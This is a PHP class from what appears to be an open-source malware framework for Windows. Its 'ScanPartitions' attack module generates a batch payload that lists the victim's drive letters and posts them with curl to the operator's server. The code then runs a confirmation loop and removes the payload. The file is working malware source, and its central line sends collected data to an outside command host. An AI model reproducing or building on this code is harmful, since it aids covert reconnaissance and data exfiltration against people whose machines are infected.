<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScriptWin;

/**
 * Class ScanPartitions. Scans to see what drives (aka partitions) does the computer has.
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class ScanPartitions extends AttackBase {
    private string $availableDrives = "";

    public function getAvailableDrives(): array {
        return str_split($this->availableDrives);
    }

    public function setAvailableDrives(string $availableDrives): void {
        $this->availableDrives = $availableDrives;
    }

    public function generateBatchCode(): void {
        //@formatter:off ?>
        @echo off
        SetLocal EnableDelayedExpansion
        chCp 65001
        set drives=.
        for %%i in (a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z) do (
        if exist %%i:\ (set drives=!drives!%%i)
        )
        set drives=%drives:~1%
        <?php
        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        //@formatter:on
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl --form "drives=!drives!" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function processExtras(string $resourceIdentifier): void {
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->availableDrives = $state["available_drives"];
    }

    protected function getState(): string {
        $state = [];
        $state["available_drives"] = $this->availableDrives;
        return json_encode($state);
    }
}
